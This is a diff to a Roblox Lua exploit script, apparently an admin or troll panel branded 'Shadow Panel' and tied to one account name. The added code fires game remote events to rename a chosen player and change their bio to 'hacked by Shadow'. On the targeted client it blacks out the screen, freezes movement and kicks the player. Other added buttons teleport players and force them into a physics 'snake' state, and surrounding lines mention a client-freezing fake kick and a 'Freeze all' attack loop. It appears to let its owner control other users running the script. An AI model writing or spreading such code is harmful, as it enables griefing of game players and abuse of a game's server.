@@ -56,9 +56,11 @@ local localPlayer = LocalPlayer
 local TextChatService = game:GetService("TextChatService")
 local TweenService = game:GetService("TweenService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
 local AdminEnabled = true
 local attackEnabled = false
+local activeSnakes = {}
 
 -- Replace Kick function: fake disconnect UI + infinite loop (freezes client)
 local function KickLocalPlayer(message)
@@ -597,7 +599,7 @@ if LocalPlayer and LocalPlayer.Name == "youssef126608" then
                         Name = ";Admin off",
                         Callback = function()
                             AdminEnabled = false
-                            sendChatMessage(".; Admin off")
+                            sendChatMessage(";Admin off")
                         end
                     })
                 end)
@@ -606,19 +608,222 @@ if LocalPlayer and LocalPlayer.Name == "youssef126608" then
                         Name = ";Admin on",
                         Callback = function()
                             AdminEnabled = true
-                            sendChatMessage("Admin on;")
+                            sendChatMessage(";Admin on")
                         end
                     })
                 end)
 
                 pcall(function()
                     adm:AddToggle({
-                        Name = "Freeze all",
+                        Name = ";Freeze all",
                         Default = false,
                         Callback = function(value)
                             attackEnabled = value
                             if attackEnabled then
                                 startAssaultLoop()
+                            end
+                        end
+                    })
+                end)
+
+                
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";hack",
+                        Callback = function()
+                            if not AdminEnabled then return end
+                            if SelectedPlayer and SelectedPlayer ~= "" then
+                                local ReplicatedStorage = game:GetService("ReplicatedStorage")
+                                local RE = ReplicatedStorage:WaitForChild("RE")
+                                local Players = game:GetService("Players")
+                                local targetPlayer = Players:FindFirstChild(SelectedPlayer)
+
+                                sendChatMessage("[Shadow Panel] Hacked: "..SelectedPlayer)
+
+                                local args1 = {"RolePlayName", "hacked by Shadow"}
+                                RE:WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args1))
+
+                                local args2 = {"PickingRPNameColor", Color3.fromRGB(150, 0, 0)}
+                                RE:WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args2))
+
+                                local args3 = {"RolePlayBio", "This player was hacked by Shadow... "}
+                                RE:WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args3))
+
+                                local args4 = {"PickingRPBioColor", Color3.fromRGB(20, 20, 20)}
+                                RE:WaitForChild("1RPNam1eColo1r"):FireServer(unpack(args4))
+
+                                if SelectedPlayer == LocalPlayer.Name then
+                                    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+                                    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+                                    local Humanoid = Character:WaitForChild("Humanoid")
+
+                                    local ScreenGui = Instance.new("ScreenGui")
+                                    ScreenGui.Name = "FullImageGui"
+                                    ScreenGui.IgnoreGuiInset = true
+                                    ScreenGui.ResetOnSpawn = false
+                                    ScreenGui.Parent = PlayerGui
+
+                                    local ImageLabel = Instance.new("ImageLabel")
+                                    ImageLabel.Parent = ScreenGui
+                                    ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+                                    ImageLabel.Position = UDim2.new(0, 0, 0, 0)
+                                    ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+                                    ImageLabel.BackgroundTransparency = 0
+                                    ImageLabel.Image = "rbxassetid://95103023162136"
+                                    ImageLabel.ImageTransparency = 0
+                                    ImageLabel.ScaleType = Enum.ScaleType.Fit
+
+                                    Humanoid.WalkSpeed = 0
+                                    Humanoid.JumpPower = 0
+                                    Humanoid.AutoRotate = false
+
+                                    local Sound = Instance.new("Sound")
+                                    Sound.SoundId = "rbxassetid://115163639351877"
+                                    Sound.Volume = 5
+                                    Sound.Looped = false
+                                    Sound.Parent = workspace
+                                    Sound:Play()
+
+                                    Sound.Ended:Connect(function()
+                                        if Humanoid then
+                                            Humanoid.WalkSpeed = 16
+                                            Humanoid.JumpPower = 50
+                                            Humanoid.AutoRotate = true
+                                        end
+                                        if ScreenGui then
+                                            ScreenGui:Destroy()
+                                        end
+                                    end)
+
+                                    task.wait(20)
+                                    LocalPlayer:Kick("You have been hacked by Shadow...")
+                                end
+                            end
+                        end
+                    })
+                end)
+
+                
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";Throw",
+                        Callback = function()
+                            if not AdminEnabled then return end
+                            if SelectedPlayer and SelectedPlayer ~= "" then
+                                sendChatMessage("[Shadow Panel] Throw Cannon on: "..SelectedPlayer)
+                                if SelectedPlayer == LocalPlayer.Name then
+                                    local player = game.Players.LocalPlayer
+                                    local character = player.Character or player.CharacterAdded:Wait()
+                                    local hrp = character:WaitForChild("HumanoidRootPart")
+
+                                    hrp.CFrame = CFrame.new(66, 3, -125)
+
+                                    local args = {"PickingTools","Cannon"}
+                                    game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack(args))
+
+                                    task.wait(1)
+                                    local backpack = player:WaitForChild("Backpack")
+                                    local cannon = backpack:FindFirstChild("Cannon")
+
+                                    if cannon then
+                                        cannon.Parent = character
+                                        local args2 = {
+                                            Vector3.new(64.40155792236328, 0.024999618530273438, -109.1260986328125),
+                                            workspace:WaitForChild("Model"):WaitForChild("Street"):WaitForChild("Street")
+                                        }
+                                        cannon:WaitForChild("AttemptPlaceProp"):FireServer(unpack(args2))
+                                        task.wait(0.5)
+                                        hrp.CFrame = CFrame.new(64, 3, -114)
+                                        task.wait(0.5)
+                                        hrp.CFrame = CFrame.new(64, 4, -110)
+                                        task.wait(0.5)
+                                        character:WaitForChild("Humanoid"):UnequipTools()
+                                    end
+                                end
+                            end
+                        end
+                    })
+                end)
+
+                
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";Snake",
+                        Callback = function()
+                            if not AdminEnabled then return end
+                            if SelectedPlayer and SelectedPlayer ~= "" then
+                                sendChatMessage("[Shadow Panel] Snake mode enabled: "..SelectedPlayer)
+                                if SelectedPlayer == LocalPlayer.Name then
+                                    local player = Players.LocalPlayer
+                                    local character = player.Character or player.CharacterAdded:Wait()
+                                    local humanoid = character:WaitForChild("Humanoid")
+                                    local root = character:WaitForChild("HumanoidRootPart")
+
+                                    if activeSnakes[player] then return end
+
+                                    activeSnakes[player] = {
+                                        stepped = nil,
+                                        render = nil,
+                                        sitConn = nil,
+                                        platConn = nil
+                                    }
+
+                                    root.CFrame = CFrame.new(root.Position) * CFrame.Angles(math.rad(90), 0, 0)
+                                    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+
+                                    activeSnakes[player].stepped = RunService.Stepped:Connect(function()
+                                        if humanoid.MoveDirection.Magnitude > 0 then
+                                            root.Velocity = humanoid.MoveDirection * 10
+                                        end
+                                    end)
+
+                                    activeSnakes[player].sitConn = humanoid:GetPropertyChangedSignal("Sit"):Connect(function()
+                                        if humanoid.Sit then
+                                            humanoid.Sit = false
+                                        end
+                                    end)
+
+                                    activeSnakes[player].platConn = humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
+                                        humanoid.PlatformStand = true
+                                    end)
+
+                                    activeSnakes[player].render = RunService.RenderStepped:Connect(function()
+                                        root.CFrame = CFrame.new(root.Position) * CFrame.Angles(math.rad(90), 0, 0)
+                                    end)
+                                end
+                            end
+                        end
+                    })
+                end)
+
+                
+                pcall(function()
+                    adm:AddButton({
+                        Name = ";UnSnake",
+                        Callback = function()
+                            if not AdminEnabled then return end
+                            if SelectedPlayer and SelectedPlayer ~= "" then
+                                sendChatMessage("[Shadow Panel] Snake mode disabled: "..SelectedPlayer)
+                                if SelectedPlayer == LocalPlayer.Name then
+                                    local player = Players.LocalPlayer
+                                    if activeSnakes[player] then
+                                        for _, conn in pairs(activeSnakes[player]) do
+                                            if typeof(conn) == "RBXScriptConnection" then
+                                                conn:Disconnect()
+                                            end
+                                        end
+                                        activeSnakes[player] = nil
+                                    end
+                                    local character = player.Character or player.CharacterAdded:Wait()
+                                    local humanoid = character:FindFirstChild("Humanoid")
+                                    if humanoid then
+                                        humanoid.PlatformStand = false
+                                    end
+                                    local root = character:FindFirstChild("HumanoidRootPart")
+                                    if root then
+                                        root.CFrame = CFrame.new(root.Position)
+                                    end
+                                end
                             end
                         end
                     })
@@ -798,6 +1003,8 @@ return {
     frameIds = frameIds
 }
 ]==])()
+-- This Admin Wath made by Shadow
+-- Version 1.7
 
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
@@ -4969,6 +5176,7 @@ Duration = 5;
 
 });
 -- by Shadow
+
 
 
 
